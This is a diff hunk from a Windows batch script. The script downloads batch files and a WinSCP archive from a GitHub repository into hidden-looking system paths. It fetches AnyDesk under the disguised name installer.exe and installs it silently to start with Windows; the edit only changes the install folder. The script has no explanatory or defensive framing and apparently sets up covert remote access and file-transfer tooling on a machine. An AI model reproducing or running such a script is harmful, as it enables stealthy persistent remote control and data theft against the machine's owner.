@@ -110,7 +110,7 @@ powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss1.bat -OutFile C:\Windows\System\Text\r\3\ss1.bat
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat -OutFile C:\Windows\System\Text\r\3\gen.bat
 powershell Invoke-WebRequest https://download.anydesk.com/AnyDesk.exe -OutFile C:\Windows\SoftwareDistribution\Download\SharedFileCache\installer.exe
-C:\Windows\SoftwareDistribution\Download\SharedFileCache\installer.exe --install "C:\Windows\SoftwareDistribution\Download\SharedFileCache\AnyDesk" --start-with-win --silent --update-manually
+C:\Windows\SoftwareDistribution\Download\SharedFileCache\installer.exe --install "C:\Windows\SoftwareDistribution\Download\SharedFileCache" --start-with-win --silent --update-manually
 timeout 5
 :scp
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System\Text\r\3\scp.zip
